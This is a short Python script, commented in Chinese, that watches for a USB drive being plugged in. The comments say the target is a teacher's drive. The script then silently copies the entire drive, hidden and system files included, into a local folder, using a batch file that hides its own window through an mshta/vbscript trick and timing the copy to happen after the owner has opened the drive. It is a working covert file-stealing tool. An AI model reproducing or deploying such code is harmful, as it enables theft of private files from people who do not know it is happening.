#pip install psutil
import psutil,os
import time

#新建文件夹以存放文件
dir=os.getcwd()
try:
    os.mkdir('files')
except:
    pass
dir=dir+r'\files'
os.chdir(dir)

#获取配置信息(wait:等待时间)
try:
    with open('setting.txt','r') as f:
        file=f.read()
        wait=int(file)
except:
    wait=1 #默认等待时间

#获取分区名
def getname(copydir):
    print(dir)
    ml='dir '+copydir+' ->temp.txt'
    os.system(ml)
    with open('temp.txt','r') as f:
        name=f.readlines()[0].split('是 ')[1].split('\n')[0]
    os.remove('temp.txt')
    try:
        os.chdir(dir)
        os.mkdir(time.strftime("%H-%M-%S",time.localtime()))
        dirname=time.strftime("%H-%M-%S",time.localtime())
    except:
        pass
    return name,dirname
#获取磁盘信息
old_disk=psutil.disk_partitions()

#写一个bat隐藏复制时的窗口
def cbat(copydir,dir):
    bat=open('copy.bat','w',encoding='utf-8')
    print('@echo off',file=bat)
    print('if "%1"=="hide" goto CmdBegin',file=bat)
    print('start mshta vbscript:createobject("wscript.shell").run("""%~0"" hide",0)(window.close)&&exit',file=bat)
    print(':CmdBegin',file=bat)
    print(' ',file=bat)
    txtname=time.strftime("%H-%M-%S",time.localtime())+'.txt'
    ml='xcopy '+copydir+' '+dir+' /E /H /R '
    print(ml,file=bat)
    ml='attrib -H '+dir+' -s'
    print(ml,file=bat)
    bat.close()
    return txtname

#日志模块
class log:
    def start():
        sen='[开始运行]'+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+'\n'
        with open('log.txt','a') as f:
            f.write(sen)
    def New_Usb(disk_path,name,dirname):
        sen0='[插入]'+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+': 有U盘插入，路径为'+disk_path
        sen1='分区名: '+name+' 存放路径'+dirname+'\n'
        sen=[]
        sen.append(sen0)
        sen.append(sen1)
        with open('log.txt','a') as f:
            f.writelines(sen)
    def exit():
        sen='[拔出]'+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+': U盘拔出\n'
        with open('log.txt','a') as f:
            f.write(sen)

log.start()
#循环检测是否老师插入U盘
while True:
    new_disk=psutil.disk_partitions()
    print('当前分区数',len(new_disk))
    if len(new_disk)>len(old_disk): #当前分区数变大时，就是老师插入U盘的时候
        for i in old_disk:
            new_disk.remove(i)
        print('开始复制...')
        copydir=str(new_disk[0][0])
        name,dirname=getname(copydir)
        dir=dir+'\\'+dirname
        log.New_Usb(disk_path=copydir,name=name,dirname=dirname)
        time.sleep(wait) #建议10分钟后才开始复制，因为这是老师打开U盘的时候
        print(dir)
        txtname=cbat(copydir,dir)
        os.system('copy.bat')
        print('bat开始运行...')
        old_disk=psutil.disk_partitions()
    elif len(new_disk)<len(old_disk): #当前分区数变小时，就是老师拔出U盘的时候
        old_disk=psutil.disk_partitions()
        try:
            os.remove('copy.bat')
        except:
            pass
        print('waiting...')
        log.exit()
        time.sleep(wait)
    else:
        print('waiting...')
        time.sleep(wait)